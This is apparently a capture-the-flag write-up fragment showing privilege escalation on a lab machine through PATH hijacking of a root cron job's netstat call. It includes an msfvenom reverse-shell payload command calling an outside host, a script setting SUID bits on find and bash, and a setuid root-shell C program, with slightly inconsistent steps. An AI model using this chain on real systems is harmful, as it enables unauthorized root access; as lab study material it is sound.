# 7 privesc cronjob

```
# pspy confirmation
2021/09/02 17:51:01 CMD: UID=0    PID=25275  | /bin/sh -c    netstat -tlpn > /root/status && service apache2 status >> /root/status && service mysql status >> /root/status

$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.49.197 LPORT=8088 -f elf -o netstat
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
Saved as: netstat

www-data@muddy:/tmp$ cd /dev/shm
www-data@muddy:/tmp$ cat netstat
#!/bin/bash
chmod +s /usr/bin/find;
cp /usr/bin/bash /tmp/kashz;
chmod +s /tmp/kashz;

www-data@muddy:/dev/shm$ chmod 777 netstat
www-data@muddy:/dev/shm$ export PATH=/dev/shm:$PAT

# wait a min

www-data@muddy:/dev/shm$ cat << EOF > setuid.c
> #include <unistd.h>
>
> int main()
> {
>     setuid(0);
>     execl("/bin/bash", "bash", (char *)NULL);
>     return 0;
> }
> EOF
www-data@muddy:/dev/shm$ gcc setuid.c -o setuid
www-data@muddy:/dev/shm$ find . -exec ./setuid \; -quit
bash-5.0# whoami;id
root
uid=0(root) gid=33(www-data) groups=33(www-data)
```
